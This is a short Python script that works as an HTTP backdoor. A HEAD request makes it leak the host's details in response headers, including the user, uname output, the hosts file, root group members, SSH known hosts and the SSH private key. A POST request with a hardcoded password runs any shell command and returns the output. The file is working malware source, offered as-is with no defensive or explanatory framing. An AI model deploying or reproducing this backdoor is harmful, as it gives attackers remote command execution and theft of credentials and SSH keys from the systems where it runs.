import sys, subprocess, socket
from http.server import HTTPServer, BaseHTTPRequestHandler

class config:
    bind_address = "127.0.0.1"
    bind_port = 1337
    password = "password"

def execCommand(command):
    cmd = subprocess.check_output(command, shell=True).strip()
    return str(cmd)[2:-1]

class ReqHandler(BaseHTTPRequestHandler): 
    def do_HEAD(self): # exfiltrate basic system information
        try:
            self.send_response(200)
            self.send_header("hostname", socket.gethostname()) # return system hostname
            self.send_header("current_user", execCommand(command="whoami")) # get current user
            self.send_header("current_directory", execCommand(command="pwd")) # get current directory
            self.send_header("uptime", execCommand(command="uptime")) # get system uptime
            self.send_header("uname", execCommand(command="uname -a")) # return uname output
            self.send_header("local_ip", socket.gethostbyname(socket.gethostname())) # return local IP
            self.send_header("ssh_knownhosts", execCommand(command="cat ~/.ssh/known_hosts")) # return all SSH known hosts
            self.send_header("ssh_publickeys", execCommand(command="cat ~/.ssh/id_rsa.pub")) # return SSH public keys
            self.send_header("ssh_privatekey", execCommand(command="cat ~/.ssh/id_rsa")) # return SSH private key
            self.send_header("root_users", execCommand(command="grep root /etc/group")) # get all users with root access
            self.send_header("hosts_file", execCommand(command="cat /etc/hosts")) # return the hosts file contents
            self.end_headers()
        except:
            pass

    def do_POST(self): # run shell commands and return the output
        password = str(self.headers["pwd"])
        contentLength = int(self.headers["Content-Length"])
        command = self.rfile.read(contentLength)
        if str(password) == str(config.password):
            command = str(command)[2:-1] # remove bytes from command header
            self.send_response(200) # send HTTP status code
            cmd_output = execCommand(command=command)
            self.send_header("output", str(cmd_output))
            self.end_headers()
        else:
            pass

httpBackdoor = HTTPServer((config.bind_address, config.bind_port), ReqHandler)
try:
    httpBackdoor.serve_forever()
except:
    httpBackdoor.server_close()
    sys.exit()
